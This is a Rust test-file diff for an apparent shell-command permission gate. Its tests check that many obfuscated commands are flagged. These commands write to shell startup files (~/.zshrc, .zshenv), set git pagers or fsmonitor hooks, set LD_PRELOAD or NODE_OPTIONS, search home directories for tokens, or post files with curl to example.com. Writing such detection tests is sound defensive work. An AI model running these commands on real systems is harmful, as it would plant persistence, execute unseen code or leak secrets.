-        ("zsh", "=$X log --output=~/.zshrc"),
-        ("bash", "echo x | =tee -a ~/.zshrc"),
-        ("zsh", "echo x | =tee -a ~/.zshrc"),
-        ("zsh", "noglob =tee -a ~/.zshrc"),
-        ("bash", "- =tee -a ~/.zshrc"),
-        ("bash", "=$(printf tee) -a ~/.zshrc"),
-        ("zsh", "=sort -o ~/.zshrc f"),
-        // Review 1: behind a modifier and a wrapper, after an exec marker
-        // or an exec wrapper.
-        ("zsh", "noglob command =tee -a ~/.zshrc"),
-        ("zsh", "noglob nice =sort -o ~/.zshrc f"),
-        ("zsh", r"find . -exec =tee -a ~/.zshrc \;"),
-        ("zsh", "strace =tee -a ~/.zshrc"),
-        // Review 2: a quoted `#` word; an exec wrapper's options.
-        ("zsh", r"find . -name '#*#' -exec =tee -a ~/.zshrc \;"),
-        ("zsh", "find '#dir' -exec =tee -a ~/.zshrc {} +"),
-        ("zsh", "strace -f =tee -a ~/.zshrc"),
-    ];
-    let persistence = [
-        ("bash", "noglob git log --output=~/.zshrc"),
-        ("zsh", "noglob git log --output=~/.zshrc"),
-        ("zsh", "nocorrect git log --output=~/.zshrc"),
-        ("zsh", "noglob nocorrect git log --output=~/.zshrc"),
-        ("bash", "noglob nice git log --output=~/.zshrc"),
-        ("zsh", "noglob tee -a ~/.zshrc"),
-        ("zsh", "noglob sort -o ~/.zshrc f"),
-        ("bash", "cd \"$d\"; noglob git log --output=.zshenv"),
-    ];
-    // Every line is checked before the test fails. On Windows, whose
-    // reading may name another kind first (`=$(printf tee) -a ~/.zshrc` is
-    // `Persistence` there), a line only has to ask.
-    let mut wrong = Vec::new();
-    for (lines, expected) in [
-        (&unseen[..], ProtectedActionKind::UnseenCode),
-        (&persistence[..], ProtectedActionKind::Persistence),
-    ] {
-        for (shell, command) in lines {
-            let found = kind(&[shell, "-c", command]);
-            if found.is_none() || (!cfg!(windows) && found != Some(expected)) {
-                wrong.push(format!("{shell}: {command} -> {found:?}"));
-            }
-        }
-    }
-    for command in [
-        "noglob git log --output=out.txt",
-        "noglob ls *.txt",
-        "noglob tee out.txt",
-        "echo =x",
-        "[ \"$a\" = \"$b\" ]",
-        "# ===== setup =====",
-        "# a == b",
-        "echo hi # ==== x",
-        "find . -name '*.rs' -exec grep -n '==' {} +",
-        "noglob git commit -m '=== x'",
-    ] {
-        let found = kind(&["zsh", "-c", command]);
-        if found.is_some() {
-            wrong.push(format!("zsh: {command} -> {found:?}"));
-        }
-    }
-    assert_eq!(wrong, Vec::<String>::new());
-}
-
-/// #1309 follow-ups from the #1523 review: `run0 -D DIR`, a keep option
-/// that may be an unknown option's value, tmux's `-c DIR` (its commands
-/// read as scripts), and zsh extendedglob command words. Each line was
-/// quiet on main.
-#[test]
-fn issue_1309_follow_ups_ask() {
-    for (shell, command) in [
-        ("bash", "run0 -D ~ sh -c 'echo x >> .zshenv'"),
-        ("bash", "run0 -D . sh -c 'echo x >> .zshenv'"),
-        ("bash", "run0 -uroot -D ~ sh -c 'echo x >> .zshenv'"),
-        (
-            "bash",
-            "systemd-run --on-active -d sh -c 'echo x >> .zshenv'",
-        ),
-        (
-            "bash",
-            "systemd-run --on-calendar --scope sh -c 'echo x >> .zshenv'",
-        ),
-        (
-            "bash",
-            "systemd-run --on-active --same-dir sh -c 'echo x >> .zshenv'",
-        ),
-        ("bash", "run0 --description -D sh -c 'echo x >> .zshenv'"),
-        ("bash", "pkexec --frob --keep-cwd sh -c 'echo x >> .zshenv'"),
-        ("bash", "tmux new -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new-session -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new-window -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux split-window -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux splitw -h -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux respawn-pane -k -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new -d -s x -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new -dc ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux -L s new -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new -d \\; neww -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux popup -d ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new -c ~ 'sh -c \"echo x >> .zshenv\"'"),
-        ("bash", "tmux new -c ~ 'git log --output=.zshenv'"),
-        // Review 1: run-shell, name prefixes, tmux in another case.
-        ("bash", "tmux run -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux run-shell -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux new-w -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux split-w -c ~ \"echo x >> .zshenv\""),
-        ("bash", "tmux respawn-p -c ~ \"echo x >> .zshenv\""),
-        ("bash", "TMUX new -c ~ \"echo x >> .zshenv\""),
-        ("zsh", "cdd# ~; sh -c 'echo x >> .zshenv'"),
-        ("zsh", "cd## ~; sh -c 'echo x >> .zshenv'"),
-        ("zsh", "^x ~; sh -c 'echo x >> .zshenv'"),
-        ("zsh", "cd~x ~; sh -c 'echo x >> .zshenv'"),
-        ("bash", "cdd# ~; sh -c 'echo x >> .zshenv'"),
-    ] {
-        assert_eq!(
-            kind(&[shell, "-c", command]),
-            Some(ProtectedActionKind::Persistence),
-            "{shell}: {command}"
-        );
-    }
-    for command in [
-        "systemd-run --user --same-dir sh -c 'echo x > out.txt'",
-        "systemd-run -u x -p Nice=5 --scope sh -c 'echo x > out.txt'",
-        "systemd-run --wait -q --scope sh -c 'echo x > out.txt'",
-        "pkexec --disable-internal-agent --keep-cwd sh -c 'echo x > out.txt'",
-        "tmux new \"echo x >> .zshenv\"",
-        "tmux new -s c \"echo x > out.txt\"",
-        "tmux new -d sh -c 'echo x > out.txt'",
-        "tmux send-keys -t x 'new' Enter",
-        "tmux new -c /tmp 'echo x > /tmp/out'",
-        "tmux display -p '#S'",
-        "tmux display -d 500 'echo x > .zshenv'",
-        "cd ~/w; sh -c 'echo x > out.txt'",
-    ] {
-        assert_eq!(script(command), None, "{command}");
-    }
-}
-
-/// #1159 and #1309 follow-ups: the new readings stay linear.
-#[test]
-fn issue_1309_follow_up_checks_are_linear() {
-    for (label, prefix, unit, suffix) in [
-        ("equals words", "nice ", "=x ", "echo"),
-        ("modifiers", "", "noglob ", "git log --output=out.txt"),
-        (
-            "keep options",
-            "systemd-run ",
-            "--zz ",
-            "--scope sh -c 'echo x > out.txt'",
-        ),
-        ("tmux options", "tmux new ", "-d ", "'echo x > out.txt'"),
-        ("tmux commands", "tmux ", "new 'echo x' \\; ", ""),
-        ("tmux words", "tmux ", "tmux ", "new -c ~ 'echo x'"),
-    ] {
-        work::assert_linear(label, |scale| {
-            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
-            let _ = script(&line);
-        });
-    }
-}
-
-/// #1635: follow-ups from #1528's review. Long options by prefix after an
-/// alias; aliases with built-in names older gits lack; and in the Windows
-/// reading, aliases' `--exec`, `--template` and `-qc`, and dashed helpers
-/// named as `@git-grep.exe` or `git-grep.cmd`. Only adds prompts.
-#[test]
-fn issue1635_alias_prefixes_old_builtins_and_windows_helpers_ask() {
-    use ProtectedActionKind::UnseenCode;
-    let mut wrong = Vec::new();
-    for command in [
-        // Prefixes of the long options, after an alias.
-        "git cl --te=./t u",
-        "git cl --templ ./t u",
-        "git cl --con=core.hooksPath=./h u",
-        "git cl --conf core.fsmonitor=./x u",
-        "git p --ex=./x u",
-        "git p --exe ./x u",
-        // Built-ins newer than git 2.34, or left out with breaking changes,
-        // may be aliases there.
-        "git refs -u ./x u",
-        "git hook -Osh x",
-        "git diagnose -u ./x u",
-        "git replay --template=./t u",
-        "git backfill -u ./x u",
-        "git diff-pairs -Osh x",
-        "git fsmonitor--daemon -Osh x",
-        "git whatchanged -Osh x",
-        "git pack-redundant -u ./x u",
-    ] {
-        if script(command) != Some(UnseenCode) {
-            wrong.push(command.to_string());
-        }
-        if kind(&["/bin/zsh", "-lc", command]) != Some(UnseenCode) {
-            wrong.push(format!("zsh: {command}"));
-        }
-    }
-    for line in [
-        "git p --exec=./x u",
-        "git p --ex=./x u",
-        "git cl --template=./t u",
-        "git cl --te=./t u",
-        "git cl --config=core.hooksPath=./h u",
-        "git cl -qc core.fsmonitor=./x u",
-        r"C:\Git\cmd\git.exe cl -qc core.fsmonitor=./x u",
-        "git refs -u ./x u",
-        "@git-grep.exe -Osh x",
-        "git-grep.cmd -Osh x",
-        "git-clone.cmd -u ./x u",
-        r"@C:\Git\mingw64\libexec\git-core\git-grep.exe -Osh x",
-    ] {
-        if cmd(line) != Some(UnseenCode) {
-            wrong.push(format!("cmd: {line}"));
-        }
-        if powershell(line) != Some(UnseenCode) {
-            wrong.push(format!("powershell: {line}"));
-        }
-    }
-    // As before: a word that names no helper by its command name.
-    if cmd("git-.cmd ^--upload-pack=x") != Some(UnseenCode) {
-        wrong.push("cmd: git-.cmd ^--upload-pack=x".to_string());
-    }
-    // git's own commands, and older built-ins, read as before.
-    for command in [
-        "git status -uno",
-        "git add -u",
-        "git log --template x",
-        "git commit -c HEAD",
-        "git branch -u origin/main",
-        "git worktree add ../w",
-        "git switch -c topic",
-        "git restore -s HEAD x",
-        "git maintenance run",
-        "git sparse-checkout set a",
-        "git refs list",
-        "git hook run pre-commit",
-    ] {
-        if script(command).is_some() {
-            wrong.push(format!("quiet: {command}"));
-        }
-    }
-    for line in [
-        "git status -uno",
-        "git-status.cmd -uno",
-        "@git-status.exe -uno",
-        "git log -Oorder.txt",
-    ] {
-        if cmd(line).is_some() || powershell(line).is_some() {
-            wrong.push(format!("quiet windows: {line}"));
-        }
-    }
-    assert_eq!(wrong, Vec::<String>::new());
-}
-
-/// #1607: zsh reads `>!` as `>|` (also `>>!`, `&>!`, `&>>!`, `>&!`, `>>&!`
-/// and with a descriptor, `2>!`): `echo x >! ~/.zshrc` writes `~/.zshrc`.
-/// bash and dash write a file `!` and pass the next word on, so both
-/// readings count: the `!` file, and zsh's file judged as written only
-/// (bash's words are left as they were). The `|` forms (`>>|`, `&>|`, `&>>|`, `>&|`, `>>&|`)
-/// already asked; they stay so.
-#[test]
-fn issue1607_zsh_clobber_redirections_write() {
-    use ProtectedActionKind::Credentials;
-    use ProtectedActionKind::Persistence;
-    use ProtectedActionKind::UnseenCode;
-    for shell in ["zsh", "bash"] {
-        let line = |script: &str| kind(&[shell, "-lc", script]);
-        for op in [
-            ">!", ">>!", "&>!", "&>>!", ">&!", ">>&!", "2>!", "2>>!", "1>>!", ">>|", "&>|", "&>>|",
-            ">&|", ">>&|", "2>>|",
-        ] {
-            for target in [" ~/.zshrc", "~/.zshrc", " =mytool", " \"$HOME/.zshrc\""] {
-                let script = format!("echo x {op}{target}");
-                assert_eq!(line(&script), Some(Persistence), "{shell} {script:?}");
-            }
-        }
-        for script in [
-            "make >! log; echo x >>! ~/.zshenv",
-            "sh -c \"echo x >! ~/.zshrc\"",
-            "f() { echo x >>! ~/.zshrc; }; f",
-            "(echo x &>! ~/.zshrc)",
-            "echo $(echo x >! ~/.zshrc)",
-            "cd ~ && echo x >! .zshrc",
-            "cd ~ && echo x >>!.zshenv",
-            "echo x >! ~/.zshrc 2>&1",
-            "echo x >! $(echo ~/.zshrc)",
-            "echo x >!$(echo ~/.zshrc)",
-            "echo x >>! `echo ~/.zshrc`",
-            "echo x >! ~/$(echo .zshrc)",
-        ] {
-            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
-        }
-        // The line's variables count in zsh's file as in any other
-        // (review round 2): it asks as `>` does (`>|` is no measure: the
-        // word reading splits it as a pipe, so its file is also a program).
-        for op in [">!", ">>!", "&>!", "2>!"] {
-            for template in [
-                "f=~/.zshrc; echo x OP $f",
-                "f=~/.zshrc; echo x OP\"$f\"",
-                "f=~/.zshrc; echo x OP \"$f\"",
-                "f=$(cat notes); echo x OP \"$f\"",
-                "P=..; cd /home/fixture/w && echo x OP $P/.zshrc",
-                "P=../../../../..; cd /home/fixture/w; for i in 1 2 3 4; do cd d; echo x OP $P/.zshrc; done",
-            ] {
-                let script = template.replace("OP", op);
-                let plain = template.replace("OP", &op.replace('!', ""));
-                let expected = line(&plain);
-                assert!(expected.is_some(), "{shell} {plain:?}");
-                assert_eq!(line(&script), expected, "{shell} {script:?}");
-            }
-        }
-        // bash's words stay as they were: git runs with the option the
-        // `>!` precedes, `~` is still what grep reads (not a `-C` value),
-        // `read` still sets the variable it names.
-        assert!(line("git >! -c core.pager=sh log").is_some(), "{shell}");
-        for (script, expected) in [
-            ("grep -r token >!-C ~", Credentials),
-            ("touch PAGER; read >! PAGE[R] <<< id; git log", UnseenCode),
-            ("read >! \"$n\" <<< x", UnseenCode),
-            ("declare >(:>!) \"$n=x\"", UnseenCode),
-        ] {
-            assert_eq!(line(script), Some(expected), "{shell} {script:?}");
-        }
-        // Ordinary redirections and pipes, a `!` elsewhere, and a quoted
-        // `!` (zsh writes a file `!`), stay as they were.
-        for script in [
-            "echo x >! out.txt",
-            "echo x >>!out.txt",
-            "make 2>! err.log",
-            "make >>! build.log 2>&1",
-            "echo x &>! out.txt",
-            "echo x >&! out.txt",
-            "echo x >>&! out.txt",
-            "echo x >>| out.txt",
-            "echo x &>| out.txt",
-            "echo x > out.txt",
-            "echo x >> log",
-            "echo x >| out.txt",
-            "ls | grep x",
-            "echo hi! > out.txt",
-            "echo x > out!",
-            "[ a != b ] && echo x > out.txt",
-            "if ! grep -q x f; then echo y >> log; fi",
-            "echo x >\\! ~/.zshrc",
-            "echo x >'!' ~/.zshrc",
-        ] {
-            assert_eq!(line(script), None, "{shell} {script:?}");
-        }
-    }
-}
-
-/// #1606 item 1: a wrapper's option value spelled `git` before its folder
-/// option does not hide the real git after it, whose output files are
-/// judged in that unknown folder. Only adds prompts.
-#[test]
-fn issue1606_git_value_before_a_wrapper_folder_option_asks() {
-    use ProtectedActionKind::Persistence;
-    for shell in ["bash", "zsh"] {
-        let line = |script: &str| kind(&[shell, "-lc", script]);
-        for script in [
-            "env -u git -iC ~ git log --output=.zshenv",
-            "env -u git -iC ~ git config -f .zshenv core.pager sh",
-            "docker exec -u git -w ~ c git log --output=.zshenv",
-            "docker exec -u git -w ~ c git config -f .zshenv core.pager sh",
-            // As before.
-            "env -iC ~ git log --output=.zshenv",
-            "docker exec -w ~ c git log --output=.zshenv",
-            // Review 1: git before a wrapper and its folder option, a
-            // wrapper's long option value spelled `git`, and `=git` after it.
-            "=git submodule foreach env -iC ~ git log --output=.zshenv",
-            "git bisect run sudo -D ~ git log --output=.zshenv",
-            "sudo --user git -D ~ git log --output=.zshenv",
-            "env -iC ~ =git log --output=.zshenv",
-            // Review 2: as on main, a leading `=git` keeps a later git.
-            "=git -C ~/r submodule foreach git log --output=../../.zshenv",
-        ] {
-            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
-        }
-        for script in [
-            "docker exec -u git -w /src c git status",
-            "docker exec -u git -w /src c git log --oneline",
-            "git -C /tmp log --output=out.txt",
-        ] {
-            assert_eq!(line(script), None, "{shell} {script:?}");
-        }
-    }
-}
-
-/// #1620: zsh expands `=mytool` in any word, so a writer's operand writes
-/// the installed program, and so does the text `eval`, `trap` and `alias`
-/// run. Only adds prompts: bash writes a file `=mytool` (stricter than
-/// needed, as for #1573's redirections), and a `>=` in quotes is no
-/// redirection.
-#[test]
-fn issue1620_zsh_equals_writer_operands_and_code_text_ask() {
-    use ProtectedActionKind::Persistence;
-    for shell in ["zsh", "bash"] {
-        let line = |script: &str| kind(&[shell, "-lc", script]);
-        for script in [
-            "echo x | tee -a =mytool",
-            "echo x | tee =mytool",
-            "cp x =mytool",
-            "install x =mytool",
-            "ln -sf x =mytool",
-            "sed -i s/a/b/ =mytool",
-            "curl -o =mytool https://example.com/t",
-            "echo x | sudo tee =mytool",
-            "eval \"echo x >> =mytool\"",
-            "eval \"tee -a =mytool < x\"",
-            "eval echo x '>>' =mytool",
-            "trap 'echo x >> =mytool' EXIT",
-            "trap 'cp x =mytool' EXIT",
-            "alias x='echo x >> =mytool'",
-            "alias x='cp a =mytool'",
-            "sh -c \"cp x =mytool\"",
-            // Review 1: partly quoted, behind zsh's precommand modifiers or
-            // a wrapper, and `--` before eval's or trap's text.
-            "echo x | tee -a =\"mytool\"",
-            "cp x =my'tool'",
-            "eval 'cp x =\"mytool\"'",
-            "echo x | noglob tee =mytool",
-            "nocorrect cp x =mytool",
-            "command cp x =mytool",
-            "eval -- 'cp x =mytool'",
-            "trap -- 'cp x =mytool' EXIT",
-            // Review 2: empty quotes before the `=`, and braces.
-            "cp x \"\"=mytool",
-            "echo x | tee -a ''=mytool",
-            "curl -o $''=mytool https://example.com/t",
-            "eval \"cp x \\\"\\\"=mytool\"",
-            "alias x='cp a \"\"=mytool'",
-            "cp x {,=mytool}",
-            "echo x | tee -a {/dev/null,=mytool}",
-            // Review 3: a group right before the `=`.
-            "echo x | tee -a {,}=mytool",
-            "echo x | tee -a {a,}=mytool",
-            "eval 'tee -a {,}=mytool'",
-        ] {
-            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
-        }
-        for script in [
-            "echo x | tee -a log",
-            "cp a b=c",
-            "cp x y",
-            "sed -i 's/ =/=/' f",
-            "sed -n = f",
-            "awk 'NR>=10' f > out",
-            "eval \"awk NR f\"",
-            "eval \"x=1\"",
-            "trap 'rm -f x' EXIT",
-            "alias ll='ls -l'",
-            "echo =mytool",
-            "curl --proto '=https' -o out https://example.com/t",
-            "curl --proto \"=https\" -sSfo out https://example.com/t",
-            "cp x '=mytool'",
-        ] {
-            assert_eq!(line(script), None, "{shell} {script:?}");
-        }
-    }
-    // #1602's gate also reads joined literals in another language's file
-    // (`|| self.rebuilt > 0`).
-    #[cfg(unix)]
-    assert_eq!(
-        in_workspace(
-            &[(
-                "t.py",
-                "import os\nos.system(\"echo x >\" + \"> =mytool\")\n"
-            )],
-            "python3 t.py"
-        ),
-        Some(Persistence)
-    );
-}
-
-/// #1620: reading the text `eval`, `trap` and `alias` run stays linear.
-#[test]
-fn issue1620_code_text_checks_are_linear() {
-    for (label, unit) in [
-        ("eval words", "eval echo x; "),
-        ("eval arguments", "eval a b c d e f g h; "),
-        ("trap values", "trap 'echo x' 1 2 3; "),
-        ("alias values", "alias a=b c='d e' f=g; "),
-        ("writer operands", "cp a b c d e f; "),
-    ] {
-        work::assert_linear(label, |scale| {
-            let _ = kind(&["zsh", "-lc", &unit.repeat(100 * scale)]);
-        });
-    }
-    work::assert_linear("one long eval", |scale| {
-        let _ = kind(&["zsh", "-lc", &format!("eval {}", "x ".repeat(2000 * scale))]);
-    });
-}
-
 /// #1636: options a brace group or an empty expansion makes are judged in
 /// git's command as the shell cuts it, with no quote on the line: the word
 /// lexer cuts the command first or does not expand the group.
@@ -11659,4 +11205,407 @@ fn issue1636_non_ascii_expansions_read() {
         script("git clone ${${é}:---upload-pack=./x} r d"),
         Some(ProtectedActionKind::UnseenCode)
     );
+}
+
+/// #1623: `((` is looked for as arithmetic only in command position, after
+/// `for`, or after an array assignment's `=`, not in a `case` pattern or
+/// `[[ ... ]]`. No line changes whether it asks: each verdict below is
+/// main's (before this change), in bash and zsh.
+#[test]
+fn issue1623_arithmetic_check_placement_keeps_verdicts() {
+    use ProtectedActionKind::UnseenCode;
+    let asks = [
+        "a=((1)) git -C .(N) config core.pager sh",
+        "a=((1)); git -C .(N) config core.pager sh",
+        "case x in ((a)) git -C .(N) config core.pager sh;; esac",
+        "[[ ((a == a)) ]] && git -C .(N) config core.pager sh",
+        "echo x ((git -C .(N) config core.pager sh))",
+        // Review: a `((` in a `case` pattern inside an outer arithmetic span
+        // (reached through process substitution) must not keep that span.
+        "(( a >(case x in ((b)) ;; esac); git -C .(N) config core.pager sh ))",
+        "(( a <(case x in ((b)) ;; esac); git -C .(N) config core.pager sh ))",
+    ];
+    let quiet = [
+        // Not command position: read as before.
+        "a=((1)); git log",
+        "a=((x) (y)); echo ${a[@]}",
+        // Neither shell runs it (zsh: missing end of string; bash: syntax
+        // error), and it stays quiet.
+        "a=((git -C .(N) config core.pager sh))",
+        "case x in ((a)) echo a;; esac",
+        "[[ ((a == a)) ]] && git log",
+        "echo ((1))",
+        "f() ((1)); f",
+        // Command position and `for`: arithmetic as before.
+        "for ((i=0; i<3; i++)); do git log; done",
+        "for (( git -C .(N) config core.pager sh )); do :; done",
+        "(( x = 1 )) && git log",
+        "if (( x > 1 )); then git log; fi",
+        "while (( x < 1 )); do git log; done",
+        "! (( x )) || git log",
+        "time (( x )); git log",
+        "x=$(( 1 + (2) )); git log",
+        "{ (( x = 2*(1) )); }; git log",
+        "( (( x = 2*(1) )) ); git log",
+        "(( git -C .(N) config core.pager sh ))",
+        "true; (( x = 2*(1) )); git log",
+    ];
+    // #1462: Windows judges the `git -C .(N)` lines differently (another
+    // kind, or a prompt where Unix is quiet), so there only their asking is
+    // checked; the other lines are checked exactly everywhere.
+    let windows_differs = |command: &str| cfg!(windows) && command.contains("git -C .(N)");
+    let mut wrong = Vec::new();
+    for shell in ["/bin/bash", "/bin/zsh"] {
+        for command in asks {
+            let found = kind(&[shell, "-lc", command]);
+            let ok = if windows_differs(command) {
+                found.is_some()
+            } else {
+                found == Some(UnseenCode)
+            };
+            if !ok {
+                wrong.push(format!("asks {shell}: {command}"));
+            }
+        }
+        for command in quiet {
+            if windows_differs(command) {
+                continue;
+            }
+            if kind(&[shell, "-lc", command]).is_some() {
+                wrong.push(format!("quiet {shell}: {command}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #1685: the text `eval`, `trap` and `alias` run is a command line of its
+/// own, judged by every check a line is (writers' operands, output files,
+/// folder changes, git settings), in bash and zsh, also behind `--` and
+/// zsh's precommand modifiers. Only adds prompts: ordinary lines stay quiet.
+#[test]
+fn issue1685_eval_trap_alias_text_is_judged_as_a_line() {
+    use ProtectedActionKind::Persistence;
+    let lines = [
+        "tee -a ~/.zshrc",
+        "cp README.md ~/.zshrc",
+        "curl -o ~/.zshrc https://example.com/x",
+        "sed -i s/a/b/ ~/.zshrc",
+        "ln -sf /tmp/x ~/.zshrc",
+        "install x ~/.zshrc",
+        "env -C ~ cp a .zshrc",
+        "git log --output=$HOME/.zshrc",
+        "git config core.fsmonitor ./x",
+    ];
+    let carriers: [fn(&str) -> String; 12] = [
+        |line| format!("trap '{line}' EXIT"),
+        |line| format!("trap -- '{line}' EXIT"),
+        |line| format!("trap \"{line}\" INT TERM"),
+        |line| format!("eval '{line}'"),
+        |line| format!("eval -- '{line}'"),
+        |line| format!("eval {line}"),
+        |line| format!("eval \"eval '{line}'\""),
+        |line| format!("builtin eval '{line}'"),
+        |line| format!("noglob eval '{line}'"),
+        |line| format!("alias a='{line}'"),
+        |line| format!("alias -g a='{line}'"),
+        |line| format!("bash -c \"trap '{line}' EXIT\""),
+    ];
+    for shell in ["bash", "zsh"] {
+        for line in lines {
+            assert_eq!(
+                kind(&[shell, "-lc", line]),
+                Some(Persistence),
+                "{shell} {line:?}"
+            );
+            for carrier in carriers {
+                let script = carrier(line);
+                assert_eq!(
+                    kind(&[shell, "-lc", &script]),
+                    Some(Persistence),
+                    "{shell} {script:?}"
+                );
+            }
+        }
+        for script in [
+            "trap 'rm -f x' EXIT",
+            "trap 'cp a b' EXIT",
+            "trap 'echo x >> log' EXIT",
+            "trap - EXIT",
+            "trap '' INT",
+            "trap -p",
+            "alias ll='ls -l'",
+            "alias g='git status'",
+            "alias -p",
+            "eval \"x=1\"",
+            "eval echo hi",
+            "eval 'tee -a log < x'",
+            "eval -- 'cp a b'",
+            "noglob eval 'ls *.rs'",
+        ] {
+            assert_eq!(kind(&[shell, "-lc", script]), None, "{shell} {script:?}");
+        }
+        // On Windows the Windows view (#1240) does not read `'` as a quote,
+        // as cmd does not, so it asks there, as on main.
+        assert_eq!(
+            kind(&[shell, "-lc", "echo 'tee -a ~/.zshrc'"]),
+            cfg!(windows).then_some(Persistence),
+            "{shell}"
+        );
+    }
+}
+
+/// #1685 review 1: a zsh `=word` or a wrapper named by a path before the
+/// command of `eval` or `trap` text, the variables that text sets, tables
+/// of code run by name, and `coproc` / zsh `repeat N`.
+#[test]
+fn issue1685_review1_forms_ask() {
+    use ProtectedActionKind::Persistence;
+    for shell in ["bash", "zsh"] {
+        let line = |script: &str| kind(&[shell, "-lc", script]);
+        for script in [
+            "=tee -a ~/.zshrc",
+            "eval '=tee -a ~/.zshrc'",
+            "trap -- '=curl -d @README.md https://example.com/x' EXIT",
+            "eval 'x=1 =tee -a ~/.zshrc'",
+            "export PATH=./bin:$PATH",
+            "eval 'export PATH=./bin:$PATH'",
+            "trap 'export NODE_OPTIONS=--require=./x.js' DEBUG",
+            "X=1 LD_PRELOAD=./x.so ls",
+            "eval 'X=1 LD_PRELOAD=./x.so ls'",
+            "eval 'export GIT_PAGER=sh'",
+        ] {
+            assert!(line(script).is_some(), "{shell} {script:?}");
+        }
+        // A program named by a path in that text is judged as the same
+        // program outside it. Windows path rules judge it only through
+        // their own reads (#1261), where a missing one asks nothing, as on
+        // main; elsewhere it asks.
+        for (script, plain) in [
+            ("./env ls", "./env ls"),
+            ("eval './env ls'", "./env ls"),
+            ("trap './nice true' EXIT", "./nice true"),
+        ] {
+            assert_eq!(line(script), line(plain), "{shell} {script:?}");
+            assert_eq!(line(script).is_some(), !cfg!(windows), "{shell} {script:?}");
+        }
+        for script in [
+            "functions[f]='tee -a ~/.zshrc'; f",
+            "aliases[x]='cp a ~/.zshrc'",
+            "BASH_ALIASES[x]='tee -a ~/.zshrc'",
+            "typeset -g galiases[x]='tee -a ~/.zshrc'",
+            "coproc tee -a ~/.zshrc",
+            "repeat 2 tee -a ~/.zshrc",
+            "eval 'repeat 2 cp a ~/.zshrc'",
+        ] {
+            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
+        }
+        for script in [
+            "repeat 3 echo hi",
+            "coproc cat",
+            "aliases[ll]='ls -l'",
+            "eval 'X=1 ls'",
+            "trap 'x=1' EXIT",
+        ] {
+            assert_eq!(line(script), None, "{shell} {script:?}");
+        }
+    }
+}
+
+/// #1685 review 2: a table value after a later `]=`, array forms of the
+/// tables, variables `eval` text sets, and trap's quoted action.
+#[test]
+fn issue1685_review2_forms_ask() {
+    use ProtectedActionKind::Persistence;
+    for shell in ["bash", "zsh"] {
+        let line = |script: &str| kind(&[shell, "-lc", script]);
+        assert_eq!(
+            line("functions[f]+='tee -a ~/.zshrc #]=x'; f"),
+            Some(Persistence),
+            "{shell}"
+        );
+        for script in [
+            "aliases+=(x 'tee -a ~/.zshrc')",
+            "functions=(f 'cp a ~/.zshrc')",
+            "BASH_ALIASES+=([x]='tee -a ~/.zshrc')",
+            "typeset -A aliases=(x 'tee -a ~/.zshrc')",
+            "eval 'F=~/.zshrc'; tee -a \"$F\"",
+            "eval F=~/.zshrc; cp a $F",
+            "eval 'export F=~/.zshrc'; cp a \"$F\"",
+            "trap \"git config --comment 'x --get ' core.pager sh\" EXIT",
+            "trap -- \"cp a '$HOME/.zshrc'\" EXIT",
+            // Review 3: a variable with a value keeps it (trap text runs
+            // later), and other ways to fill zsh's `functions`.
+            "trap 'HOME=/x' EXIT; grep -r token \"$HOME\"",
+            "if false; then eval HOME=/x; fi; grep -r t \"$HOME\"",
+            "printf -v 'functions[f]' %s 'tee -a ~/.zshrc'; f",
+            ": ${functions[f]::='tee -a ~/.zshrc'}; f",
+            "set -A functions f 'tee -a ~/.zshrc'; f",
+            "typeset -n r=functions",
+            // Review 4: `+A`, the name attached, an earlier option.
+            "set +A functions f 'tee -a ~/.zshrc'; f",
+            "set -Afunctions f 'tee -a ~/.zshrc'; f",
+            "set -xAfunctions f 'tee -a ~/.zshrc'; f",
+            "read -A -r functions < x",
+            // Review 5: behind zsh's modifiers, `zparseopts`, and a
+            // whole-table assignment in an expansion.
+            "noglob set -A functions f 'tee -a ~/.zshrc'; f",
+            "print -r 'f:x' | IFS=: noglob read -A functions; f",
+            "set -- -f 'tee -a ~/.zshrc'; zparseopts -A functions -- f:; -f",
+            ": ${(AA)=functions::=f print\\ -r\\ --\\ ~/.zshrc}; f",
+            ": ${functions::=x}",
+            // #1704: any writer naming a table fails closed.
+            "read -r functions < x",
+        ] {
+            assert!(line(script).is_some(), "{shell} {script:?}");
+        }
+        for script in [
+            "trap 'echo \"done\"' EXIT",
+            "eval \"x=1\"",
+            "aliases[ll]='ls -l'",
+            "ls -A functions",
+            "set -- functions",
+            "firebase deploy --only=functions",
+            "grep -rn functions src",
+            "jq '.functions[0]' f.json",
+        ] {
+            assert_eq!(line(script), None, "{shell} {script:?}");
+        }
+        // A trap removing a `mktemp` path asks only as the line without it
+        // does: nothing, under POSIX path rules (D191); Windows path rules
+        // have no D191 scope, so the write to the temp path asks there, as
+        // on main.
+        let plain = "tmp=$(mktemp); echo x > \"$tmp\"";
+        let trapped = "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; echo x > \"$tmp\"";
+        assert_eq!(line(trapped), line(plain), "{shell}");
+        assert_eq!(line(trapped).is_some(), cfg!(windows), "{shell}");
+    }
+}
+
+/// #1685: following `eval` and `trap` text through more of them stays
+/// linear.
+#[test]
+fn issue1685_carried_commands_are_linear() {
+    work::assert_linear("eval and trap chain", |scale| {
+        let chain = format!(
+            "{}tee -a log",
+            "eval -- noglob trap -- ".repeat(500 * scale)
+        );
+        let _ = kind(&["zsh", "-lc", &chain]);
+    });
+    work::assert_linear("many traps", |scale| {
+        let _ = kind(&["bash", "-lc", &"trap 'cp a b' EXIT; ".repeat(200 * scale)]);
+    });
+    work::assert_linear("eval with zsh =words", |scale| {
